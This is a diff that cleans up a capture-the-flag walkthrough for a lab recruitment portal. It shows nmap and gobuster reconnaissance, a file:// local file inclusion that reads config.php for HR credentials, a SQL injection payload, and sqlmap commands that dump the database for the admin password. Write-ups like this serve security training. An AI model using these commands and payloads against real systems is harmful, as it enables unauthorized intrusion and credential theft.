@@ -1,49 +1,73 @@
 # Recruit
-Recruit has just launched its new recruitment portal, allowing HR staff to manage candidate applications and administrators to oversee hiring decisions. While the platform appears functional, management suspects that security may have been overlooked during development. Your task is to assess the application like a real attacker, mapping its structure, abusing exposed functionality, and exploiting vulnerabilities.
+
+Recruit has just launched its new recruitment portal, allowing HR staff to manage candidate applications and administrators to oversee hiring decisions. While the platform appears functional, management suspects that security may have been overlooked during development. Your task is to assess the application like a real attacker by mapping its structure, abusing exposed functionality, and exploiting vulnerabilities.
 
 Can you gain an initial foothold, escalate your access, and ultimately log in as the administrator?
-Answer the questions below
 
-**What is the flag value after logging in as a normal user?**
+### Objectives
 
-**What is the flag value after logging in as admin?**
+* What is the flag value after logging in as a normal user?
+* What is the flag value after logging in as the administrator?
 
 ---
 
-Let's start with some basic reconnisance to discover some secrets!
+## Reconnaissance
 
+I started with a basic Nmap scan to identify the services running on the target.
 
-**nmap -sS 10.81.182.40**
+**Command:**
+
+```bash
+nmap -sS 10.81.182.40
 ```
+
+**Output:**
+
+```text
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-02 11:12 -0400
 Nmap scan report for 10.81.182.40
 Host is up (0.031s latency).
 Not shown: 997 closed tcp ports (reset)
+
 PORT   STATE SERVICE
 22/tcp open  ssh
 53/tcp open  domain
 80/tcp open  http
 ```
-after using nmap I have found 3 open ports. Port 80 takes us to a login page! Time to enumerate some directories!
 
-**gobuster dir -w raft-medium-directories.txt -u http://10.81.182.40 -x html, php, txt, js**
-```
-assets               (Status: 301) [Size: 313] [--> http://10.81.182.40/assets/]
-mail                 (Status: 301) [Size: 311] [--> http://10.81.182.40/mail/]
-javascript           (Status: 301) [Size: 317] [--> http://10.81.182.40/javascript/]
-phpmyadmin           (Status: 301) [Size: 317] [--> http://10.81.182.40/phpmyadmin/]
-server-status        (Status: 403) [Size: 277]
-Progress: 89997 / 89997 (100.00%)
+The scan revealed three open ports: **22 (SSH)**, **53 (DNS)**, and **80 (HTTP)**. Visiting port 80 presented a login page, so the next step was to enumerate directories.
+
+## Directory Enumeration
+
+**Command:**
+
+```bash
+gobuster dir -w raft-medium-directories.txt -u http://10.81.182.40 -x html,php,txt,js
 ```
 
-Mail look's intresting lets check it out!
+**Output:**
+
+```text
+assets               (Status: 301) [--> http://10.81.182.40/assets/]
+mail                 (Status: 301) [--> http://10.81.182.40/mail/]
+javascript           (Status: 301) [--> http://10.81.182.40/javascript/]
+phpmyadmin           (Status: 301) [--> http://10.81.182.40/phpmyadmin/]
+server-status        (Status: 403)
 ```
+
+The **/mail** directory looked particularly interesting, so I decided to investigate it.
+
+## Finding HR Credentials
+
+The `/mail` directory contained the following email:
+
+```text
 Hi Team,
 
 Just a quick update to confirm that the new Recruitment Portal
 has been deployed successfully and is functioning as expected.
 
-Weâ€™ve completed basic validation:
+We’ve completed basic validation:
 - Login page is accessible
 - Candidate dashboard loads correctly
 - API documentation page is live
@@ -62,30 +86,68 @@ Thanks,
 HR Operations
 Recruitment Team
 ```
-We have recived the first part of the puzzle, the username! It say's the password is in config.php but after check I found out the page is blank. There must be another way to view it. After checking out other pages that I'm allowed to view I find a intresting snippet on the API page. ```You can fetch a candidate CV using the following endpoint:
-/file.php?cv=<URL>``` So with this infomation I assumed you can grab the contents of the config.php from the API. 
-```http://10.81.182.40/file.php?cv=file://config.php``` I was right, and I finally recievded the password for HR **hr########d123** 
 
-After logging in we get the first flag and access to the dashboard.
+This email provided the **HR username** (`hr`) and stated that the password was stored in `config.php`.
 
-Now I am on the second part of the puzzle, getting the admin login!
-there's nothing intresting on this page besides a search bar. I tried some xss payloads which failed. then I tried some SQL payloads. 
+I attempted to browse directly to `config.php`, but the page was blank. Since PHP files are executed by the web server, this was expected. There had to be another way to retrieve its contents.
 
-**PAYLOAD USED:** ' OR 1=1--
+While exploring the application, I found an interesting note in the API documentation:
 
+```text
+You can fetch a candidate CV using the following endpoint:
+/file.php?cv=<URL>
 ```
+
+This suggested a potential **Local File Inclusion (LFI)** vulnerability using the `file://` wrapper. I tested the following URL:
+
+```text
+http://10.81.182.40/file.php?cv=file://config.php
+```
+
+The attack was successful, and the contents of `config.php` were returned, revealing the HR password:
+
+```text
+hr########d123
+```
+
+Using these credentials, I logged in as the HR user, gaining access to the dashboard and obtaining the **first flag**.
+
+## Finding the Administrator Credentials
+
+The next objective was to gain administrative access.
+
+The dashboard didn't initially reveal anything particularly interesting apart from a search bar. I first tested several XSS payloads, but none were successful.
+
+Next, I tested for SQL injection using the following payload:
+
+```sql
+' OR 1=1--
+```
+
+This produced the following error:
+
+```text
 SQL Error:
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
 ```
-which gave me a error message, which indicates it's a sql vulenabilitie!
 
-I used sqlmap to dump the database to try and find some secrets!
+Receiving a verbose SQL error strongly suggested that the search functionality was vulnerable to **SQL injection**.
 
-**SQLMAP :** sqlmap -u "http://10.81.182.40/dashboard.php?search" --cookie="PHPSESSID=44m0seitiqso7im6g91e3se9iq" --forms --crawl=2 -D database --dbs
+## Exploiting SQL Injection with sqlmap
 
-which gave me:
+To automate the exploitation process, I used `sqlmap` against the search functionality.
+
+**Command:**
+
+```bash
+sqlmap -u "http://10.81.182.40/dashboard.php?search" \
+--cookie="PHPSESSID=44m0seitiqso7im6g91e3se9iq" \
+--forms --crawl=2 --dbs
 ```
-[12:04:12] [WARNING] reflective value(s) found and filtering out
+
+The scan identified the available databases:
+
+```text
 available databases [6]:
 [*] information_schema
 [*] mysql
@@ -94,27 +156,34 @@ available databases [6]:
 [*] recruit_db
 [*] sys
 ```
-Perfect it works! time to dump some tables!
 
-**SQLMAP :** sqlmap -u "http://10.81.182.40/dashboard.php?search" --cookie="PHPSESSID=44m0seitiqso7im6g91e3se9iq" --forms --crawl=2 -D recruit_db --dump-all --dbs
+The `recruit_db` database looked promising, so I dumped its contents.
 
-which gave me:
+**Command:**
+
+```bash
+sqlmap -u "http://10.81.182.40/dashboard.php?search" \
+--cookie="PHPSESSID=44m0seitiqso7im6g91e3se9iq" \
+--forms --crawl=2 \
+-D recruit_db --dump-all
 ```
+
+This returned the following credentials:
+
+```text
 Database: recruit_db
 Table: users
-[1 entry]
+
 +----+----------------+----------+
 | id | password       | username |
 +----+----------------+----------+
 | 1  | admi#####admin | admin    |
 +----+----------------+----------+
+```
 
-[12:15:05] [INFO] table 'recruit_db.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.81.182.40/dump/recruit_db/users.csv'                                                            
-[12:15:05] [INFO] fetching columns for table 'candidates' in database 'recruit_db'
-[12:15:05] [INFO] fetching entries for table 'candidates' in database 'recruit_db'
-Database: recruit_db
-Table: candidates
-[4 entries]
+The dump also revealed the `candidates` table:
+
+```text
 +----+---------------+--------------+--------------------+
 | id | name          | status       | position           |
 +----+---------------+--------------+--------------------+
@@ -124,7 +193,21 @@ Table: candidates
 | 4  | Diana Prince  | Selected     | HR Executive       |
 +----+---------------+--------------+--------------------+
 ```
-I got the admin login! After logging in with the admin details I got the final flag!
+
+Using the extracted administrator credentials, I logged in as **admin** and successfully obtained the **final flag**.
+
+## Summary
+
+This challenge involved chaining multiple vulnerabilities together:
+
+1. **Reconnaissance** with Nmap to identify exposed services.
+2. **Directory enumeration** with Gobuster to discover hidden endpoints.
+3. Information disclosure via the **mail** page, revealing the HR username and hinting that the password was stored in `config.php`.
+4. Exploitation of a **Local File Inclusion (LFI)** vulnerability using the `file://` wrapper to retrieve `config.php` and obtain the HR credentials.
+5. Authentication as the HR user to obtain the first flag.
+6. Identification and exploitation of a **SQL injection** vulnerability in the search functionality.
+7. Database extraction using `sqlmap` to recover the administrator credentials.
+8. Authentication as the administrator to obtain the final flag.
 
 
 
